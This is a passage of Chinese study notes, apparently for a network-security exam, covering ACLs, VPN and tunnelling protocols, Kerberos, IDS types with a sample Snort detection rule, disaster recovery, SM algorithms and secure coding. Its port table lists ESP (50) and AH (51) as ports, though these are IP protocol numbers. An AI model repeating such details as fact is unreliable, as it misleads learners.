<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl number 2000</span><br><span class="line"> rule 5 permit source 192.168.1.0 0.0.0.255</span><br><span class="line"> rule 10 deny source any</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>高级ACL</strong>：基于源&#x2F;目的IP、协议、端口等多条件过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl number 3000</span><br><span class="line"> rule 5 permit tcp source 192.168.1.0 0.0.0.255 destination 10.0.0.2 0 destination-port eq www</span><br><span class="line"> rule 10 deny ip source any destination any</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-隧道协议技术"><a href="#4-隧道协议技术" class="headerlink" title="4. 隧道协议技术"></a>4. 隧道协议技术</h3><h4 id="二层隧道协议"><a href="#二层隧道协议" class="headerlink" title="二层隧道协议"></a>二层隧道协议</h4><ul>
<li><strong>PPTP</strong>：早期远程拨号接入，存在安全漏洞</li>
<li><strong>L2TP</strong>：PPTP和Cisco L2F的结合，通常与IPsec结合使用</li>
</ul>
<h4 id="三层隧道协议"><a href="#三层隧道协议" class="headerlink" title="三层隧道协议"></a>三层隧道协议</h4><ul>
<li><strong>IPsec</strong>：<ul>
<li>AH(认证头)：提供数据源认证和完整性校验</li>
<li>ESP(封装安全载荷)：提供机密性、认证和完整性</li>
<li>IKE(互联网密钥交换)：用于建立安全关联</li>
<li>传输模式：只加密IP载荷</li>
<li>隧道模式：加密整个IP包</li>
</ul>
</li>
<li><strong>GRE</strong>：<ul>
<li>通用路由封装</li>
<li>通常与IPsec结合使用(GRE over IPsec)</li>
</ul>
</li>
</ul>
<h4 id="应用层隧道协议"><a href="#应用层隧道协议" class="headerlink" title="应用层隧道协议"></a>应用层隧道协议</h4><ul>
<li><strong>SSL&#x2F;TLS VPN</strong>：<ul>
<li>SSL VPN代理：通过浏览器访问特定应用</li>
<li>全隧道SSL VPN：建立完整网络连接</li>
</ul>
</li>
<li><strong>OpenVPN</strong>：<ul>
<li>基于OpenSSL库</li>
<li>配置灵活，可穿越NAT和防火墙</li>
</ul>
</li>
<li><strong>WireGuard</strong>：<ul>
<li>现代、高速、简洁的VPN协议</li>
<li>代码量少，性能高</li>
<li>使用UDP传输</li>
</ul>
</li>
<li><strong>SSH隧道</strong>：<ul>
<li>本地端口转发：将本地端口流量通过SSH隧道转发</li>
<li>远程端口转发：将远程端口流量通过SSH隧道转发</li>
</ul>
</li>
</ul>
<h4 id="根据VPN用途分类"><a href="#根据VPN用途分类" class="headerlink" title="根据VPN用途分类"></a>根据VPN用途分类</h4><ol>
<li><p><strong>远程访问VPN (Access VPN)</strong>：</p>
<ul>
<li>为远程用户提供安全接入企业内部网络</li>
<li>适用于移动办公、远程工作者</li>
</ul>
</li>
<li><p><strong>站点到站点VPN (Intranet VPN)</strong>：</p>
<ul>
<li>连接企业内部不同物理位置的网络</li>
<li>适用于企业总部与分支机构互联</li>
</ul>
</li>
<li><p><strong>基于特定协议的VPN</strong>：</p>
<ul>
<li>如SSL VPN、IPsec VPN等</li>
<li>依据底层协议实现方式分类</li>
</ul>
</li>
<li><p><strong>基于特定用途的VPN</strong>：</p>
<ul>
<li><strong>Extranet VPN</strong>：连接企业与合作伙伴网络</li>
<li><strong>Intranet VPN</strong>：连接企业内部网络</li>
</ul>
</li>
</ol>
<h2 id="四、安全协议与认证"><a href="#四、安全协议与认证" class="headerlink" title="四、安全协议与认证"></a>四、安全协议与认证</h2><h3 id="1-AAA认证体系"><a href="#1-AAA认证体系" class="headerlink" title="1. AAA认证体系"></a>1. AAA认证体系</h3><ul>
<li><strong>认证(Authentication)</strong>：验证用户身份</li>
<li><strong>授权(Authorization)</strong>：确定用户可使用的网络服务</li>
<li><strong>计帐(Accounting)</strong>：记录用户使用情况，用于计费</li>
</ul>
<h3 id="2-Kerberos认证协议"><a href="#2-Kerberos认证协议" class="headerlink" title="2. Kerberos认证协议"></a>2. Kerberos认证协议</h3><p><strong>Kerberos系统组成</strong>：</p>
<ul>
<li><strong>Client</strong>：请求服务的客户端</li>
<li><strong>Server</strong>：提供服务的服务器</li>
<li><strong>KDC</strong>：密钥分发中心<ul>
<li>AS：认证服务器</li>
<li>TGS：票据授予服务器</li>
</ul>
</li>
</ul>
<p><strong>认证过程</strong>：</p>
<ol>
<li><p><strong>初始认证</strong>：</p>
<ul>
<li>Client向AS请求TGT</li>
<li>AS验证Client身份，返回TGT和会话密钥</li>
</ul>
</li>
<li><p><strong>获取服务票据</strong>：</p>
<ul>
<li>Client用TGT向TGS请求服务票据</li>
<li>TGS验证TGT，返回服务票据ST和会话密钥</li>
</ul>
</li>
<li><p><strong>访问服务</strong>：</p>
<ul>
<li>Client用ST向Server请求服务</li>
<li>Server验证ST，提供服务</li>
</ul>
</li>
</ol>
<p><strong>票据类型</strong>：</p>
<ul>
<li>TGT(票据授予票据)：用于获取服务票据</li>
<li>ST(服务票据)：用于访问具体服务</li>
</ul>
<h3 id="3-RADIUS协议"><a href="#3-RADIUS协议" class="headerlink" title="3. RADIUS协议"></a>3. RADIUS协议</h3><ul>
<li><strong>远程认证拨号用户服务</strong></li>
<li><strong>特点</strong>：客户端&#x2F;服务器架构，基于UDP</li>
<li><strong>端口</strong>：认证1812，计费1813</li>
<li><strong>应用</strong>：网络接入认证、授权和计费</li>
</ul>
<h3 id="4-无线网络认证技术"><a href="#4-无线网络认证技术" class="headerlink" title="4. 无线网络认证技术"></a>4. 无线网络认证技术</h3><ul>
<li><strong>WEP</strong>：单向认证+弱加密，已不安全</li>
<li><strong>WPA&#x2F;WPA2</strong>：双向认证+AES加密</li>
<li><strong>WAPI</strong>：中国标准，双向认证+SM4加密<ul>
<li><strong>WAI</strong>：鉴别模块，使用非对称密码算法（SM2）进行身份认证</li>
<li><strong>WPI</strong>：保密模块，使用对称密码算法（SM4）进行加解密</li>
</ul>
</li>
</ul>
<h3 id="5-邮件收发协议"><a href="#5-邮件收发协议" class="headerlink" title="5. 邮件收发协议"></a>5. 邮件收发协议</h3><ul>
<li><p><strong>SMTP (Simple Mail Transfer Protocol)</strong>：用于发送邮件</p>
<ul>
<li>端口：25</li>
<li>特点：基于文本，明文传输（可使用STARTTLS加密）</li>
</ul>
</li>
<li><p><strong>POP3 (Post Office Protocol version 3)</strong>：</p>
<ul>
<li>端口：110</li>
<li>特点：将邮件下载到本地客户端，服务器通常不再保留</li>
<li>安全增强：POP3S（加密版本，端口995）</li>
</ul>
</li>
<li><p><strong>IMAP (Internet Message Access Protocol)</strong>：</p>
<ul>
<li>端口：143</li>
<li>特点：在服务器上管理邮件，可在多设备间同步</li>
<li>安全增强：IMAPS（加密版本，端口993）</li>
</ul>
</li>
</ul>
<h2 id="五、安全威胁与防御"><a href="#五、安全威胁与防御" class="headerlink" title="五、安全威胁与防御"></a>五、安全威胁与防御</h2><h3 id="1-攻击分类"><a href="#1-攻击分类" class="headerlink" title="1. 攻击分类"></a>1. 攻击分类</h3><h4 id="主动攻击"><a href="#主动攻击" class="headerlink" title="主动攻击"></a>主动攻击</h4><ul>
<li><strong>数据篡改</strong>：修改传输中的数据</li>
<li><strong>恶意代码植入</strong>：病毒、木马、勒索软件</li>
<li><strong>DDoS攻击</strong>：大量请求导致服务不可用</li>
<li><strong>特点</strong>：难以防止但可检测</li>
</ul>
<h4 id="被动攻击"><a href="#被动攻击" class="headerlink" title="被动攻击"></a>被动攻击</h4><ul>
<li><strong>网络监听</strong>：截获通信内容</li>
<li><strong>流量分析</strong>：分析通信模式</li>
<li><strong>密码嗅探</strong>：捕获密码明文</li>
<li><strong>特点</strong>：难以检测但可预防</li>
</ul>
<h3 id="2-APT攻击步骤"><a href="#2-APT攻击步骤" class="headerlink" title="2. APT攻击步骤"></a>2. APT攻击步骤</h3><ol>
<li><strong>情报收集</strong>：收集目标信息</li>
<li><strong>初始入侵</strong>：利用漏洞进入系统</li>
<li><strong>建立据点</strong>：安装后门，维持访问</li>
<li><strong>权限提升</strong>：获取更高权限</li>
<li><strong>横向移动</strong>：在网络中扩散</li>
<li><strong>数据收集与外传</strong>：窃取敏感数据</li>
<li><strong>持续化驻留</strong>：长期保持访问</li>
</ol>
<h3 id="3-入侵检测技术"><a href="#3-入侵检测技术" class="headerlink" title="3. 入侵检测技术"></a>3. 入侵检测技术</h3><h4 id="误用检测方法"><a href="#误用检测方法" class="headerlink" title="误用检测方法"></a>误用检测方法</h4><ul>
<li>基于规则：Snort、Suricata</li>
<li>基于迁移状态：STAT、USTAT</li>
<li>基于模式匹配：ClamAV</li>
<li>基于专家系统：MIDAS、IDES</li>
<li>基于协议分析：现代IDS</li>
</ul>
<h4 id="异常检测方法"><a href="#异常检测方法" class="headerlink" title="异常检测方法"></a>异常检测方法</h4><ul>
<li>基于统计：分析正常行为模式</li>
<li>基于模式预测：预测未来行为</li>
<li>基于文本分类：识别异常文本</li>
<li>基于贝叶斯推理：概率分析</li>
</ul>
<h4 id="入侵检测系统类型"><a href="#入侵检测系统类型" class="headerlink" title="入侵检测系统类型"></a>入侵检测系统类型</h4><ul>
<li><p><strong>HIDS (主机入侵检测系统)</strong>：</p>
<ul>
<li>部署在主机上，监测主机活动</li>
<li>可以检测本地攻击行为</li>
<li>不能检测网络层攻击</li>
<li>优点：对主机内部活动了解更详细</li>
<li>缺点：难以管理大规模部署</li>
</ul>
</li>
<li><p><strong>NIDS (网络入侵检测系统)</strong>：</p>
<ul>
<li>部署在网络边界或关键位置</li>
<li>监测网络流量</li>
<li>无法检测主机内部的攻击行为，如远程口令破解（但可以检测缓冲区溢出）</li>
<li>优点：对网络流量有全局视图</li>
<li>缺点：不能检测加密流量</li>
</ul>
</li>
<li><p><strong>DIDS (分布式入侵检测系统)</strong>：</p>
<ul>
<li>多个IDS组件分布在不同位置</li>
<li>通过协同工作检测分布式攻击</li>
<li>可以检测跨多个系统的攻击行为</li>
<li>优点：增强对分布式攻击的检测能力</li>
<li>缺点：部署和管理复杂</li>
</ul>
</li>
</ul>
<h4 id="Snort规则的组成"><a href="#Snort规则的组成" class="headerlink" title="Snort规则的组成"></a>Snort规则的组成</h4><p>Snort规则由规则头部和规则选项两部分组成：</p>
<ol>
<li><p><strong>规则头部</strong>：定义规则的基本属性</p>
<ul>
<li>规则动作（alert, log, pass, activate, dynamic）</li>
<li>协议（tcp, udp, icmp, ip）</li>
<li>源&#x2F;目的IP地址和端口</li>
<li>方向操作符（-&gt; 表示方向）</li>
</ul>
</li>
<li><p><strong>规则选项</strong>：定义规则的具体行为</p>
<ul>
<li><strong>消息</strong>：alert时显示的信息</li>
<li><strong>内容</strong>：匹配数据包内容</li>
<li><strong>标志</strong>：TCP标志位匹配</li>
<li><strong>端口</strong>：源&#x2F;目的端口匹配</li>
<li><strong>其他</strong>：多种检测条件</li>
</ul>
</li>
</ol>
<p>示例规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; $HOME_NET 80 (msg:&quot;WEB-MISC phf access&quot;; content:&quot;/cgi-bin/phf&quot;; nocase; sid:1001; rev:1;)</span><br></pre></td></tr></table></figure>

<h3 id="4-恶意代码分析"><a href="#4-恶意代码分析" class="headerlink" title="4. 恶意代码分析"></a>4. 恶意代码分析</h3><ul>
<li><strong>静态分析</strong>：不运行代码，直接分析</li>
<li><strong>动态分析</strong>：在受控环境中运行并监控<ul>
<li>系统行为监控</li>
<li>文件监控</li>
<li>网络监控</li>
</ul>
</li>
</ul>
<h3 id="5-恶意代码技术分类"><a href="#5-恶意代码技术分类" class="headerlink" title="5. 恶意代码技术分类"></a>5. 恶意代码技术分类</h3><ul>
<li><strong>进程注入技术</strong>：将代码注入到其他进程中</li>
<li><strong>超级管理技术</strong>：绕过安全限制</li>
<li><strong>端口反向链接技术</strong>：建立对外连接</li>
<li><strong>缓冲区溢出技术</strong>：利用缓冲区溢出漏洞</li>
</ul>
<h3 id="6-网络蠕虫传播方法"><a href="#6-网络蠕虫传播方法" class="headerlink" title="6. 网络蠕虫传播方法"></a>6. 网络蠕虫传播方法</h3><ol>
<li><strong>随机扫描</strong>：随机选择目标IP地址进行扫描</li>
<li><strong>顺序扫描</strong>：按顺序扫描IP地址范围</li>
<li><strong>选择性扫描</strong>：针对特定网络或主机进行扫描</li>
</ol>
<h2 id="六、安全管理与应急响应"><a href="#六、安全管理与应急响应" class="headerlink" title="六、安全管理与应急响应"></a>六、安全管理与应急响应</h2><h3 id="1-信息安全风险评估流程"><a href="#1-信息安全风险评估流程" class="headerlink" title="1. 信息安全风险评估流程"></a>1. 信息安全风险评估流程</h3><p>“识别风险→分析风险→评价风险→处理风险”的闭环管理</p>
<p><strong>具体步骤</strong>：</p>
<ol>
<li>资产识别</li>
<li>威胁识别</li>
<li>脆弱性识别</li>
<li>风险分析</li>
<li>风险评价</li>
<li>风险处理</li>
<li>持续监控</li>
</ol>
<p><strong>安全事件的风险值计算</strong>：</p>
<ul>
<li>安全事件发生的可能性 &#x3D; 脆弱性 × 威胁发生频率</li>
<li>安全事件的风险值 &#x3D; 安全事件发生的可能性 × 安全事件影响</li>
</ul>
<h3 id="2-应急响应常用技术"><a href="#2-应急响应常用技术" class="headerlink" title="2. 应急响应常用技术"></a>2. 应急响应常用技术</h3><ul>
<li><strong>隔离</strong>：将受影响系统隔离</li>
<li><strong>取证</strong>：收集和保存证据</li>
<li><strong>恢复</strong>：恢复系统和数据</li>
<li><strong>分析</strong>：分析攻击原因和方式</li>
<li><strong>报告</strong>：编写应急响应报告</li>
</ul>
<h3 id="3-容灾恢复等级"><a href="#3-容灾恢复等级" class="headerlink" title="3. 容灾恢复等级"></a>3. 容灾恢复等级</h3><table>
<thead>
<tr>
<th>等级</th>
<th>核心特征</th>
<th>关键技术</th>
<th>RPO</th>
<th>RTO</th>
</tr>
</thead>
<tbody><tr>
<td>0级</td>
<td>无异地数据</td>
<td>磁带+货车</td>
<td>数天&#x2F;周</td>
<td>数天&#x2F;周</td>
</tr>
<tr>
<td>1级</td>
<td>介质异地转运</td>
<td>磁带+货车+计划</td>
<td>24小时以上</td>
<td>24小时以上</td>
</tr>
<tr>
<td>2级</td>
<td>电子传送</td>
<td>网络传输备份数据</td>
<td>数小时至1天</td>
<td>数小时至1天</td>
</tr>
<tr>
<td>3级</td>
<td>电子传送+备用站点</td>
<td>热备站点+异步复制</td>
<td>数小时</td>
<td>数小时</td>
</tr>
<tr>
<td>4级</td>
<td>活动二级站点</td>
<td>集群+同步&#x2F;异步复制</td>
<td>数分钟至数小时</td>
<td>数分钟至数小时</td>
</tr>
<tr>
<td>5级</td>
<td>双中心</td>
<td>双向同步复制</td>
<td>0~数分钟</td>
<td>0~数分钟</td>
</tr>
<tr>
<td>6级</td>
<td>零数据丢失</td>
<td>分布式处理&#x2F;集群</td>
<td>0</td>
<td>极低</td>
</tr>
</tbody></table>
<h3 id="4-PDRR模型"><a href="#4-PDRR模型" class="headerlink" title="4. PDRR模型"></a>4. PDRR模型</h3><ul>
<li><strong>Protection</strong>：防御</li>
<li><strong>Detection</strong>：检测</li>
<li><strong>Response</strong>：响应</li>
<li><strong>Recovery</strong>：恢复</li>
</ul>
<h3 id="5-3R生存模型"><a href="#5-3R生存模型" class="headerlink" title="5. 3R生存模型"></a>5. 3R生存模型</h3><ul>
<li><strong>Resistance</strong>：抵抗</li>
<li><strong>Recognition</strong>：识别</li>
<li><strong>Recovery</strong>：恢复</li>
</ul>
<h2 id="七、其他重要安全概念"><a href="#七、其他重要安全概念" class="headerlink" title="七、其他重要安全概念"></a>七、其他重要安全概念</h2><h3 id="1-物理安全"><a href="#1-物理安全" class="headerlink" title="1. 物理安全"></a>1. 物理安全</h3><p><strong>物理隔离机制</strong>：</p>
<ul>
<li><strong>完全物理隔离</strong>：完全断开物理连接</li>
<li><strong>客户端隔离</strong>：<ul>
<li>双硬盘技术</li>
<li>单硬盘内外分区技术</li>
</ul>
</li>
<li><strong>数据交换隔离技术</strong>：<ul>
<li>信息摆渡技术</li>
<li>空气间隙</li>
</ul>
</li>
</ul>
<p><strong>物理隔离技术发展阶段</strong>：</p>
<ol>
<li>第一代：完全的物理隔离</li>
<li>第二代：硬件卡隔离</li>
<li>第三代：数据转播隔离</li>
<li>第四代：空气开关隔离</li>
<li>第五代：安全通道隔离</li>
</ol>
<h3 id="2-电磁泄漏"><a href="#2-电磁泄漏" class="headerlink" title="2. 电磁泄漏"></a>2. 电磁泄漏</h3><ul>
<li><strong>TEMPEST技术</strong>：防范电磁辐射导致的信息泄露</li>
<li><strong>防护措施</strong>：屏蔽机房、滤波技术、干扰技术</li>
</ul>
<h3 id="3-安全备份策略"><a href="#3-安全备份策略" class="headerlink" title="3. 安全备份策略"></a>3. 安全备份策略</h3><ul>
<li><strong>全备份</strong>：备份所有数据</li>
<li><strong>增量备份</strong>：备份自上次备份以来变化的数据</li>
<li><strong>差分备份</strong>：备份自上次全备份以来变化的数据</li>
<li><strong>镜像备份</strong>：实时同步备份</li>
</ul>
<h3 id="4-常用网络端口"><a href="#4-常用网络端口" class="headerlink" title="4. 常用网络端口"></a>4. 常用网络端口</h3><table>
<thead>
<tr>
<th>端口</th>
<th>协议</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>21</td>
<td>FTP</td>
<td>文件传输</td>
</tr>
<tr>
<td>22</td>
<td>SSH</td>
<td>安全远程登录</td>
</tr>
<tr>
<td>23</td>
<td>Telnet</td>
<td>远程登录（明文）</td>
</tr>
<tr>
<td>25</td>
<td>SMTP</td>
<td>邮件传输</td>
</tr>
<tr>
<td>53</td>
<td>DNS</td>
<td>域名解析</td>
</tr>
<tr>
<td>80</td>
<td>HTTP</td>
<td>Web服务</td>
</tr>
<tr>
<td>110</td>
<td>POP3</td>
<td>邮件接收</td>
</tr>
<tr>
<td>443</td>
<td>HTTPS</td>
<td>安全Web服务</td>
</tr>
<tr>
<td>500</td>
<td>IKE</td>
<td>IPsec密钥交换</td>
</tr>
<tr>
<td>4500</td>
<td>IPsec NAT</td>
<td>IPsec NAT穿透</td>
</tr>
<tr>
<td>50</td>
<td>ESP</td>
<td>IPsec封装安全载荷</td>
</tr>
<tr>
<td>51</td>
<td>AH</td>
<td>IPsec认证头</td>
</tr>
<tr>
<td>1433</td>
<td>SQL Server</td>
<td>数据库服务</td>
</tr>
<tr>
<td>3389</td>
<td>RDP</td>
<td>远程桌面</td>
</tr>
<tr>
<td>161</td>
<td>SNMP</td>
<td>网络管理</td>
</tr>
</tbody></table>
<h3 id="5-私有IP地址范围"><a href="#5-私有IP地址范围" class="headerlink" title="5. 私有IP地址范围"></a>5. 私有IP地址范围</h3><ul>
<li><strong>A类</strong>：10.0.0.0 ~ 10.255.255.255</li>
<li><strong>B类</strong>：172.16.0.0 ~ 172.31.255.255</li>
<li><strong>C类</strong>：192.168.0.0 ~ 192.168.255.255</li>
<li><strong>共享地址</strong>：100.64.0.0 ~ 100.127.255.255</li>
</ul>
<h3 id="6-安卓系统架构"><a href="#6-安卓系统架构" class="headerlink" title="6. 安卓系统架构"></a>6. 安卓系统架构</h3><ul>
<li><strong>Linux内核层</strong>：提供基础功能和硬件驱动</li>
<li><strong>硬件抽象层(HAL)</strong>：提供硬件接口</li>
<li><strong>Android运行时</strong>：<ul>
<li><strong>Dalvik虚拟机</strong>：早期Android使用的虚拟机</li>
<li><strong>ART虚拟机</strong>：Android 5.0后使用的虚拟机，性能更高</li>
</ul>
</li>
<li><strong>系统库层</strong>：提供C&#x2F;C++库</li>
<li><strong>应用框架层</strong>：提供Java API</li>
<li><strong>应用层</strong>：用户可见的应用程序</li>
</ul>
<p><strong>文件格式</strong>：</p>
<ul>
<li><strong>.dex</strong>：Dalvik&#x2F;ART虚拟机可执行的文件格式</li>
<li><strong>.apk</strong>：安卓应用的打包文件，包含.dex</li>
</ul>
<h2 id="八、国密算法体系"><a href="#八、国密算法体系" class="headerlink" title="八、国密算法体系"></a>八、国密算法体系</h2><h3 id="1-SM1"><a href="#1-SM1" class="headerlink" title="1. SM1"></a>1. SM1</h3><ul>
<li><strong>类型</strong>：对称加密算法</li>
<li><strong>密钥长度</strong>：128位</li>
<li><strong>分组长度</strong>：128位</li>
<li><strong>特点</strong>：硬件实现，安全性等同于AES</li>
</ul>
<h3 id="2-SM2"><a href="#2-SM2" class="headerlink" title="2. SM2"></a>2. SM2</h3><ul>
<li><strong>类型</strong>：非对称加密算法</li>
<li><strong>密钥长度</strong>：256位</li>
<li><strong>基础</strong>：椭圆曲线密码学</li>
<li><strong>用途</strong>：数字签名、密钥交换、加密</li>
</ul>
<h3 id="3-SM3"><a href="#3-SM3" class="headerlink" title="3. SM3"></a>3. SM3</h3><ul>
<li><strong>类型</strong>：哈希算法</li>
<li><strong>输出长度</strong>：256位</li>
<li><strong>特点</strong>：安全性等同于SHA-256</li>
</ul>
<h3 id="4-SM4"><a href="#4-SM4" class="headerlink" title="4. SM4"></a>4. SM4</h3><ul>
<li><strong>类型</strong>：对称加密算法</li>
<li><strong>密钥长度</strong>：128位</li>
<li><strong>分组长度</strong>：128位</li>
<li><strong>用途</strong>：无线局域网标准</li>
</ul>
<h3 id="5-SM7"><a href="#5-SM7" class="headerlink" title="5. SM7"></a>5. SM7</h3><ul>
<li><strong>类型</strong>：对称加密算法</li>
<li><strong>密钥长度</strong>：128位</li>
<li><strong>分组长度</strong>：128位</li>
<li><strong>用途</strong>：非接触式IC卡应用</li>
</ul>
<h3 id="6-SM9"><a href="#6-SM9" class="headerlink" title="6. SM9"></a>6. SM9</h3><ul>
<li><strong>类型</strong>：非对称加密算法</li>
<li><strong>特点</strong>：基于标识的密码系统</li>
<li><strong>用途</strong>：身份认证、密钥交换</li>
</ul>
<h2 id="九、网络安全管理框架"><a href="#九、网络安全管理框架" class="headerlink" title="九、网络安全管理框架"></a>九、网络安全管理框架</h2><h3 id="1-网络信息安全管理5个阶段"><a href="#1-网络信息安全管理5个阶段" class="headerlink" title="1. 网络信息安全管理5个阶段"></a>1. 网络信息安全管理5个阶段</h3><ol>
<li><strong>识别</strong>：识别组织资产、风险和威胁</li>
<li><strong>保护</strong>：实施安全控制措施</li>
<li><strong>检测</strong>：持续监控安全事件</li>
<li><strong>响应</strong>：对安全事件进行响应</li>
<li><strong>恢复</strong>：从安全事件中恢复</li>
</ol>
<h3 id="2-网络风险管理步骤"><a href="#2-网络风险管理步骤" class="headerlink" title="2. 网络风险管理步骤"></a>2. 网络风险管理步骤</h3><ol>
<li><strong>识别</strong>：识别资产、威胁和脆弱性</li>
<li><strong>评估</strong>：评估风险可能性和影响</li>
<li><strong>控制</strong>：实施风险控制措施</li>
<li><strong>监控</strong>：持续监控风险状态</li>
</ol>
<h3 id="3-蜜罐技术"><a href="#3-蜜罐技术" class="headerlink" title="3. 蜜罐技术"></a>3. 蜜罐技术</h3><ul>
<li><strong>空系统</strong>：无实际服务的诱饵系统</li>
<li><strong>镜像系统</strong>：真实系统的副本</li>
<li><strong>虚拟系统</strong>：模拟真实系统的虚拟环境</li>
</ul>
<h3 id="4-安全评估指标"><a href="#4-安全评估指标" class="headerlink" title="4. 安全评估指标"></a>4. 安全评估指标</h3><ul>
<li><strong>RPO</strong>(Recovery Point Objective)：可接受的最大数据丢失量</li>
<li><strong>RTO</strong>(Recovery Time Objective)：可接受的最大服务中断时间</li>
<li><strong>MTD</strong>(Maximum Tolerable Downtime)：最大可容忍停机时间</li>
</ul>
<h2 id="十、安全工具与技术"><a href="#十、安全工具与技术" class="headerlink" title="十、安全工具与技术"></a>十、安全工具与技术</h2><h3 id="1-网络扫描技术"><a href="#1-网络扫描技术" class="headerlink" title="1. 网络扫描技术"></a>1. 网络扫描技术</h3><h4 id="端口扫描技术全面详解"><a href="#端口扫描技术全面详解" class="headerlink" title="端口扫描技术全面详解"></a>端口扫描技术全面详解</h4><p>(此处已包含在之前的完整笔记中，略)</p>
<h3 id="2-ARP欺骗过程"><a href="#2-ARP欺骗过程" class="headerlink" title="2. ARP欺骗过程"></a>2. ARP欺骗过程</h3><p>(此处已包含在之前的完整笔记中，略)</p>
<h3 id="3-SSL-TLS协议详解"><a href="#3-SSL-TLS协议详解" class="headerlink" title="3. SSL&#x2F;TLS协议详解"></a>3. SSL&#x2F;TLS协议详解</h3><p>(此处已包含在之前的完整笔记中，略)</p>
<h3 id="4-IPsec协议详解"><a href="#4-IPsec协议详解" class="headerlink" title="4. IPsec协议详解"></a>4. IPsec协议详解</h3><p>(此处已包含在之前的完整笔记中，略)</p>
<h3 id="5-常见安全事件与漏洞对应关系"><a href="#5-常见安全事件与漏洞对应关系" class="headerlink" title="5. 常见安全事件与漏洞对应关系"></a>5. 常见安全事件与漏洞对应关系</h3><h4 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h4><ol>
<li><p><strong>非技术性安全漏洞</strong>：</p>
<ul>
<li>网络安全责任主体不明确</li>
<li>网络安全策略不完备</li>
<li>网络安全操作技能不足</li>
<li>网络安全监督缺失</li>
<li>网络安全特权控制不完备</li>
</ul>
</li>
<li><p><strong>技术性安全漏洞</strong>：</p>
<ul>
<li>设计错误</li>
<li>输入验证错误</li>
<li>缓冲区溢出</li>
<li>意外情况处置错误</li>
<li>访问验证错误</li>
<li>配置错误</li>
<li>竞争条件</li>
<li>环境错误</li>
</ul>
</li>
</ol>
<h4 id="常见安全事件与漏洞对应关系"><a href="#常见安全事件与漏洞对应关系" class="headerlink" title="常见安全事件与漏洞对应关系"></a>常见安全事件与漏洞对应关系</h4><table>
<thead>
<tr>
<th>安全事件</th>
<th>对应漏洞</th>
<th>防御措施</th>
</tr>
</thead>
<tbody><tr>
<td>SQL注入</td>
<td>输入验证错误</td>
<td>参数化查询、输入过滤、WAF</td>
</tr>
<tr>
<td>XSS攻击</td>
<td>输入验证错误</td>
<td>输出编码、内容安全策略</td>
</tr>
<tr>
<td>CSRF攻击</td>
<td>访问验证错误</td>
<td>CSRF令牌、SameSite Cookie</td>
</tr>
<tr>
<td>缓冲区溢出</td>
<td>编程错误</td>
<td>安全编码实践、边界检查</td>
</tr>
<tr>
<td>远程口令破解</td>
<td>认证机制缺陷</td>
<td>强密码策略、多因素认证、账户锁定</td>
</tr>
<tr>
<td>未授权访问</td>
<td>访问控制缺陷</td>
<td>最小权限原则、RBAC模型</td>
</tr>
<tr>
<td>信息泄露</td>
<td>配置错误</td>
<td>安全配置审核、敏感信息保护</td>
</tr>
<tr>
<td>会话劫持</td>
<td>会话管理缺陷</td>
<td>安全会话管理、HTTPS</td>
</tr>
</tbody></table>
<h3 id="6-Apache-Web日志文件"><a href="#6-Apache-Web日志文件" class="headerlink" title="6. Apache Web日志文件"></a>6. Apache Web日志文件</h3><ul>
<li><p><strong>访问日志 (access.log)</strong>：</p>
<ul>
<li>记录所有HTTP请求信息</li>
<li>包含客户端IP、请求时间、请求方法、URL、HTTP状态码、响应大小等</li>
<li>格式可自定义，通常为Common Log Format或Combined Log Format</li>
</ul>
</li>
<li><p><strong>错误日志 (error.log)</strong>：</p>
<ul>
<li>记录服务器运行中的错误信息</li>
<li>包含错误级别、时间、错误消息、相关请求等</li>
<li>帮助诊断服务器问题</li>
</ul>
</li>
<li><p><strong>其他日志</strong>：</p>
<ul>
<li>代理日志：记录通过Apache代理的请求</li>
<li>SSL日志：记录SSL&#x2F;TLS连接相关信息</li>
<li>自定义日志：根据需求配置的特定日志</li>
</ul>
</li>
</ul>
<h2 id="十一、安全编码与实践"><a href="#十一、安全编码与实践" class="headerlink" title="十一、安全编码与实践"></a>十一、安全编码与实践</h2><h3 id="1-安全编码原则"><a href="#1-安全编码原则" class="headerlink" title="1. 安全编码原则"></a>1. 安全编码原则</h3><ul>
<li><strong>最小权限原则</strong>：程序只拥有完成任务所需的最小权限</li>
<li><strong>防御性编程</strong>：假设所有输入都是恶意的</li>
<li><strong>输入验证</strong>：对所有输入进行严格验证</li>
<li><strong>输出编码</strong>：防止XSS等攻击</li>
<li><strong>错误处理</strong>：安全地处理错误，不泄露敏感信息</li>
</ul>
<h3 id="2-常见安全漏洞"><a href="#2-常见安全漏洞" class="headerlink" title="2. 常见安全漏洞"></a>2. 常见安全漏洞</h3><ul>
<li><strong>缓冲区溢出</strong>：数据写入超过缓冲区容量</li>
<li><strong>SQL注入</strong>：在SQL查询中插入恶意代码</li>
<li><strong>XSS</strong>：在网页中注入恶意脚本</li>
<li><strong>CSRF</strong>：跨站请求伪造</li>
<li><strong>命令注入</strong>：在系统命令中注入恶意代码</li>
<li><strong>不安全的直接对象引用</strong>：直接暴露内部对象</li>
</ul>
<h3 id="3-安全开发流程"><a href="#3-安全开发流程" class="headerlink" title="3. 安全开发流程"></a>3. 安全开发流程</h3><ol>
<li><strong>需求阶段</strong>：识别安全需求</li>
<li><strong>设计阶段</strong>：设计安全架构</li>
<li><strong>实现阶段</strong>：安全编码实践</li>
<li><strong>测试阶段</strong>：安全测试和渗透测试</li>
<li><strong>部署阶段</strong>：安全配置和监控</li>
<li><strong>维护阶段</strong>：持续安全评估和更新</li>
</ol>
<h2 id="十二、总结与应试要点"><a href="#十二、总结与应试要点" class="headerlink" title="十二、总结与应试要点"></a>十二、总结与应试要点</h2><h3 id="1-国密算法（重中之重）"><a href="#1-国密算法（重中之重）" class="headerlink" title="1. 国密算法（重中之重）"></a>1. 国密算法（重中之重）</h3><ul>
<li><strong>SM1&#x2F;SM4&#x2F;SM7</strong>：对称加密，密钥和分组都是128位</li>
<li><strong>SM2</strong>：非对称加密（基于ECC），用于签名&#x2F;密钥交换&#x2F;加密</li>
<li><strong>SM3</strong>：哈希算法，输出256位</li>
</ul>
<h3 id="2-对称加密"><a href="#2-对称加密" class="headerlink" title="2. 对称加密"></a>2. 对称加密</h3><ul>
